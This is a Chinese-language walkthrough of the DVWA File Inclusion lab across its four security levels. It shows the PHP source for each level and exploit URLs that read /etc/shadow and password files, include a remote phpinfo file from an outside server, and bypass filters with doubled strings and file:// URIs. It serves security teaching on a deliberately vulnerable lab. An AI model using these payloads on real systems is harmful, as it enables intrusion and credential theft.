<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><pre><code>文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</code></pre><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php 

// The page we wish to display 
$file = $_GET[ &apos;page&apos; ]; 

?&gt; </code></pre><p>可以看到page参数没有经过任何过滤，可以读取任意文件</p>
<p>本地文件包含</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/etc/shadow        #读取shadow文件
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../2.txt    
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=C:\Users\Administrator\Desktop\password.txt                可以读取本地文件</code></pre><p>php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别</p>
<p>远程文件包含</p>
<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
<p>在服务器端写入文件phpinfo.txt，内容为&lt;?php phpinfo();&gt;</p>
<p>下面进行远程文件包含</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://服务器ip/phpinfo.txt</code></pre><p>可以对page参数进行url编码隐藏</p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php 

// The page we wish to display 
$file = $_GET[ &apos;page&apos; ]; 

// Input validation 
$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); 
$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); 

?&gt; </code></pre><p>代码审计可知，medium将http://、https:// 、../、..\替换为空，但我们仍然可以进行双写绕过（只影响相对路径，绝对路径不受影响）</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=..././..././..././1.txt</code></pre><p>远程文件包含</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=hthttp://tp://服务器ip/phpinfo.txt</code></pre><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><pre><code>
&lt;?php 

// The page we wish to display 
$file = $_GET[ &apos;page&apos; ]; 

// Input validation 
if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) { 
    // This isn&apos;t the page we want! 
    echo &quot;ERROR: File not found!&quot;; 
    exit; 
} 

?&gt;</code></pre><p>fnmatch按照指定的模式来匹配文件名或字符串，这里要求page参数的开头必须是file，但我们可以通过file协议绕过</p>
<pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file:///C:\Users\Administrator\Desktop\password.txt</code></pre><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php 

// The page we wish to display 
$file = $_GET[ &apos;page&apos; ]; 

// Only allow include.php or file{1..3}.php 
if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) { 
    // This isn&apos;t the page we want! 
    echo &quot;ERROR: File not found!&quot;; 
    exit; 
} 

?&gt; </code></pre><p>限定了只能够访问file1.php、file2.php、file3.php,基本防御了文件包含漏洞</p>
